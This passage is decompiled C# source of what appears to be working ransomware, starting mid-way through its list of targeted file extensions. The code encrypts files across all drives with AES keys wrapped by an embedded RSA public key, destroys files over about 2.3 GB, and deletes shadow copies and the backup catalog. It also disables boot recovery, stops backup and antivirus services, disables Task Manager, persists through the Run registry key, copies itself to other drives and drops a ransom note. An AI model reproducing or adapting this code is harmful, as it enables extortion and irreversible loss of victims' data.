		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>/Uu4aRF+zFBGwyFGe/bJfD/3pzP1wfyrfCO3WjNiDSyHEebtNZvN5wSYOw7mFY/S8TYfm/R7OcEsvvrnvFcIk3j6yUT26kNcyszgN/iJhnkARR2ES52ULKmPAta7oskOsDG9OCW+LO0WxyZr2qA/H+4D+OyqoWKwAlK9w9dNIn2kaTdHRzIvD+aOL4V8LI9eXLpDvyIdk3y8U5CdCZBjd4+4P119oXnwMNOatmthJJBIYAWaGzQntWopyTjO8JOIX+RiloOMdZoFJjW0SW7zcRRok6CmPgOYFh9NI7VFfax/jSjDS6cJ9Cp0fqXXQ+obv0A7X+RnZeVB/OPi3ZaBcQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
